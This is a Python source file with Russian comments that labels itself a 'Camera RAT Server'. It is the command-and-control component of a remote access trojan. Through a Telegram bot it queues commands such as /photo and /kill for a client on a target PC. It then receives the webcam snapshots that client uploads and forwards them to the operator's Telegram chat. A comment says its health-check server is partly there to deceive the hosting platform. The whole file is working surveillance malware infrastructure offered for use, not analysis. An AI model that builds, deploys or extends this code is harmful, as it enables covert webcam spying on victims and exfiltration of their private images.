#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Telegram Bot Server — работает на Render
Служит мостом между Telegram и твоим ПК-клиентом
"""

import os
import sys
import time
import requests
import logging
import json
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

# ===== ТВОИ ДАННЫЕ =====
BOT_TOKEN = os.environ.get("BOT_TOKEN")  # Читаем секретный токен из панели Render
CHAT_ID = "8722858929"                   # Твой ID чата
# =======================

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# Переменная для обмена командами между TG и ПК
current_command = "NONE"

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(message)s',
    datefmt='%H:%M:%S'
)
log = logging.info


def send_message(chat_id, text):
    url = f"{API_URL}/sendMessage"
    try:
        resp = requests.post(url, data={'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}, timeout=10)
        return resp.json().get('ok', False)
    except Exception as e:
        log(f"Send error: {e}")
        return False


def get_updates(offset=None):
    url = f"{API_URL}/getUpdates"
    params = {'timeout': 30, 'offset': offset}
    try:
        resp = requests.get(url, params=params, timeout=35)
        return resp.json()
    except Exception as e:
        log(f"Updates error: {e}")
        return {'ok': False, 'result': []}


def handle_command(chat_id, text):
    global current_command
    text = text.strip()
    
    if text == '/start':
        send_message(chat_id,
            "🤖 **Camera RAT Server**\n\n"
            "Команды:\n"
            "📸 /photo — сделать фото веб-камерой ПК\n"
            "⚙️ /status — проверить статус\n"
            "💀 /kill — выключить клиент на ПК\n"
            "❓ /help — помощь"
        )
    
    elif text == '/photo':
        current_command = "TAKE_PHOTO"
        send_message(chat_id, "⏳ Команда отправлена на ПК. Ожидайте снимок...")
        log("Задана команда: TAKE_PHOTO")
    
    elif text == '/status':
        send_message(chat_id, f"✅ **Сервер на Render активен**\nТекущая команда в буфере: `{current_command}`")
    
    elif text == '/kill':
        current_command = "KILL"
        send_message(chat_id, "💀 Отправлена команда на выключение ПК-клиента.")
        log("Задана команда: KILL")
    
    elif text == '/help':
        send_message(chat_id,
            "/photo — сделать фото\n"
            "/status — статус сервера\n"
            "/kill — выключить скрипт на ПК"
        )
    
    else:
        send_message(chat_id, "❌ Неизвестная команда. Используй /help")


# ===== УМНЫЙ ВЕБ-СЕРВЕР ДЛЯ СВЯЗИ С ПК (И ОБМАНА RENDER) =====
class RenderBridgeHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return  # Отключаем лишний спам запросов в консоль сервера

    def do_GET(self):
        global current_command
        
        # 1. Если ПК-клиент запрашивает команду
        if self.path == '/get_command':
            self.send_response(200)
            self.send_header("Content-type", "application/json; charset=utf-8")
            self.end_headers()
            
            # Отдаем строго JSON формат!
            response_data = {"command": current_command}
            self.wfile.write(json.dumps(response_data).encode("utf-8"))
            
            # Если команда была "сделать фото", сбрасываем её, так как ПК её уже забрал
            if current_command == "TAKE_PHOTO":
                current_command = "NONE"
                
        # 2. Главная страница (для проверки Render Health Check)
        else:
            self.send_response(200)
            self.send_header("Content-type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write("Бот-сервер работает! Маршруты /get_command и /upload_photo активны.".encode("utf-8"))

    def do_POST(self):
        # 3. Если ПК-клиент загружает сделанное фото
        if self.path == '/upload_photo':
            try:
                # Читаем заголовки, чтобы понять длину входящего файла
                content_length = int(self.headers['Content-Length'])
                body = self.rfile.read(content_length)
                
                log("📥 Сервер получил байты от ПК. Пересылаю в Telegram...")
                
                # Извлекаем сырые байты картинки (упрощенная обработка multipart)
                # Чтобы не тянуть тяжелые библиотеки, находим границы файла
                if b'image/jpeg' in body:
                    header_end = body.find(b'\r\n\r\n', body.find(b'image/jpeg')) + 4
                    footer_start = body.rfind(b'\r\n--', len(body)-100)
                    photo_bytes = body[header_end:footer_start]
                else:
                    photo_bytes = body  # Если отправлено чистым бинарником
                
                # Пуляем фото напрямую в Telegram админу
                url = f"{API_URL}/sendPhoto"
                files = {'photo': ('webcam.jpg', photo_bytes, 'image/jpeg')}
                data = {'chat_id': CHAT_ID, 'caption': f"📸 Снимок с веб-камеры ПК\nВремя: {datetime.now().strftime('%H:%M:%S')}"}
                
                tg_resp = requests.post(url, files=files, data=data, timeout=30)
                
                if tg_resp.json().get('ok'):
                    log("🚀 Фото успешно переслано админу в Telegram!")
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"OK")
                else:
                    log(f"❌ Ошибка Telegram API: {tg_resp.text}")
                    self.send_response(500)
                    self.end_headers()
            except Exception as e:
                log(f"❌ Ошибка обработки POST-запроса фото: {e}")
                self.send_response(500)
                self.end_headers()


def run_health_check_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), RenderBridgeHandler)
    log(f"Сетевой мост для ПК запущен на порту {port}")
    server.serve_forever()


def main():
    log("=" * 40)
    log("Camera RAT Server запущен на Render")
    log(f"Chat ID: {CHAT_ID}")
    log("=" * 40)
    log("Ожидание команд в Telegram...")
    
    last_update_id = 0
    
    while True:
        try:
            data = get_updates(offset=last_update_id + 1)
            
            if data.get('ok') and data.get('result'):
                for update in data['result']:
                    update_id = update.get('update_id', 0)
                    last_update_id = update_id
                    
                    if 'message' in update:
                        msg = update['message']
                        chat_id = msg.get('chat', {}).get('id')
                        text = msg.get('text', '')
                        
                        # Проверяем, что сообщение от нашего админа
                        if str(chat_id) == str(CHAT_ID):
                            log(f"Команда от админа: {text}")
                            handle_command(chat_id, text)
                        else:
                            log(f"Сообщение от постороннего {chat_id}: {text}")
                            send_message(chat_id, "❌ Доступа нет.")
        
        except KeyboardInterrupt:
            log("\n👋 Остановлен")
            break
        except Exception as e:
            log(f"Ошибка в цикле обновлений: {e}")
            time.sleep(5)


if __name__ == "__main__":
    # 1. Запускаем Веб-сервер обработки команд и картинок в фоновом потоке
    threading.Thread(target=run_health_check_server, daemon=True).start()
    
    # 2. Запускаем основной цикл Telegram-бота
    main()
